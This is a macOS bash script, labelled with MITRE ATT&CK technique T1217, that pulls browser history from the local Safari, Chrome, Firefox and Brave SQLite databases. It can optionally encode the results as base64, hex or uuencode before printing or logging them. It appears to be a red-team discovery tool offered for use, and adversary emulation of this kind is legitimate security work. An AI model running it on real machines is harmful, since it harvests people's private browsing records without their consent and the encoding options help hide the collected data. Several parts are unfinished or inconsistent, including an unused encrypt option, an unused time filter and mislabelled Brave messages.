# Script Name: browserHistory.sh
# MITRE ATT&CK Technique: T1217
# Author: @darmado | https://x.com/darmad0
# Date: Sun Sep 15 19:17:19 PDT 2024
# Version: 1.0

# Description:
# This script extracts browser history from Safari, Chrome, and Firefox on macOS systems.
# It is aligned with MITRE ATT&CK Technique T1217: Browser History Discovery.

# Global Variables
NAME="browser_history"
TTP_ID="T1217"
LOG_FILE="${TTP_ID}_${NAME}.log"
LOG_ENABLED=false
VERBOSE=false
ENCODE="none"
ALL=false
START_TIME=""
END_TIME=""


# Function: Display help/usage message
display_help() {
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "-h, --help           Show this help message and exit"
    echo "-a, --all            Extract history from all supported browsers"
    echo "-v, --verbose        Enable verbose output"
    echo "-s, --safari         Extract Safari browser history"
    echo "-c, --chrome         Extract Chrome browser history"
    echo "-f, --firefox        Extract Firefox browser history"
    echo "-l, --log            Log output to file"
    echo "--encode=TYPE        Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
}

# Function: Log messages
log() {
    local message="$1"
    if [ "$LOG_ENABLED" = true ]; then
        echo "$(date +"%Y-%m-%d %H:%M:%S") - $message" >> "$LOG_FILE"
    else
        echo "$message"
    fi
}

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}


# Helper function: for  time range
# Function to convert human-readable time to Brave/Chrome timestamp format
convert_time_range() {

    
    if [[ -n "$START_TIME" && -n "$END_TIME" ]]; then
        # Convert START_TIME and END_TIME to microseconds since January 1, 1601
        local start_microseconds=$(($(date -j -f "%Y-%m-%d %H:%M:%S" "$START_TIME" "+%s") * 1000000 + 11644473600000000))
        local end_microseconds=$(($(date -j -f "%Y-%m-%d %H:%M:%S" "$END_TIME" "+%s") * 1000000 + 11644473600000000))
        
        echo "$start_microseconds" "$end_microseconds"
    fi
}




# Function to extract Safari history
safari_history() {
    local safari_db="$HOME/Library/Safari/History.db"
    local output

    if [[ -f "$safari_db" ]]; then
        output=$(sqlite3 "$safari_db" "SELECT url, visit_time FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id;" 2>&1)

        if [ $? -eq 0 ]; then
            log "Successfully extracted Safari browser history"
            log "$(encode_output "$output")"
        else
            log "Error: Unable to extract Safari history. Authorization might be denied."
            log "$(encode_output "$output")"
        fi
    else
        log "Error: Safari history database not found."
    fi
}



# Function to extract Brave browser histor

#TOO check in  - afer wireless cjar 



brave_history() {
    local brave_db="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
    local output

    if [[ -f "$brave_db" ]]; then
        output=$(sqlite3 "$brave_db" "SELECT last_visit_time, url FROM urls;" 2>&1)

        if [ $? -eq 0 ]; then
            log "Successfully extracted Brave browser history"
            log "$(encode_output "$output")"
        else
            log "Error: Unable to extract Chrome history. Authorization might be denied."
            log "$(encode_output "$output")"
        fi
    else
        log "Error: Chrome history database not found."
    fi
}

# Function to extract Chrome history
chrome_history() {
    local chrome_db="$HOME/Library/Application Support/Google/Chrome/Default/History"
    local output

    if [[ -f "$chrome_db" ]]; then
        output=$(sqlite3 "$chrome_db" "SELECT last_visit_time, url FROM urls;" 2>&1)

        if [ $? -eq 0 ]; then
            log "Successfully extracted Chrome browser history"
            log "$(encode_output "$output")"
        else
            log "Error: Unable to extract Chrome history. Authorization might be denied."
            log "$(encode_output "$output")"
        fi
    else
        log "Error: Chrome history database not found."
    fi
}

# Function to extract Firefox history
firefox_history() {
    local firefox_db=$(find ~/Library/Application\\ Support/Firefox/Profiles -name "places.sqlite")
    local output

    if [[ -f "$firefox_db" ]]; then
        output=$(sqlite3 "$firefox_db" "SELECT url, last_visit_date FROM moz_places;" 2>&1)

        if [ $? -eq 0 ]; then
            log "Successfully extracted Firefox browser history"
            log "$(encode_output "$output")"
        else
            log "Error: Unable to extract Firefox history. Authorization might be denied."
            log "$(encode_output "$output")"
        fi
    else
        log "Error: Firefox history database not found."
    fi
}




# Function to extract history from all supported browsers
all_browser_history() {
    safari_history
    chrome_history
    firefox_history
    brave_history
}

# Main logic that runs after argument parsing
main() {
    if [ "$ALL" = true ]; then
        all_browser_history
    fi

    if [ "$SAFARI" = true ]; then
        safari_history
    fi

    if [ "$CHROME" = true ]; then
        chrome_history
    fi

    if [ "$FIREFOX" = true ]; then
        firefox_history
    fi
    
    if [ "$BRAVE" = true ]; then
        brave_history
    fi
}

# Argument Parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) 
            display_help; exit 0 ;;  # Show help message and exit
        -a|--all) 
            ALL=true ;;  # Extract history from all browsers
        -v|--verbose) 
            VERBOSE=true ;;  # Enable verbose output
        -s|--safari) 
            SAFARI=true ;;  # Extract Safari browser history
        -c|--chrome) 
            CHROME=true ;;  # Extract Chrome browser history
        -f|--firefox) 
            FIREFOX=true ;;  # Extract Firefox browser history
        -b|--brave) 
            BRAVE=true ;;  # Extract Brave browser history
        -l|--log) 
            LOG_ENABLED=true ;;  # Enable logging to a file
        --encode=*) 
            ENCODE="${1#*=}" ;;  # Set encoding method (e.g., base64)
        --encrypt=*) 
            ENCRYPT_KEY="${1#*=}" ;;  # Set encryption key
        --start=*) 
            START_TIME="${1#*=}" ;;  # Set global start time
        --end=*) 
            END_TIME="${1#*=}" ;;  # Set global end time
        *) 
            echo "Unknown option: $1"; 
            display_help; exit 1 ;;  # Handle unknown options and display help
    esac
    shift  # Move to the next argument
done


# Start the main function
main "$@"
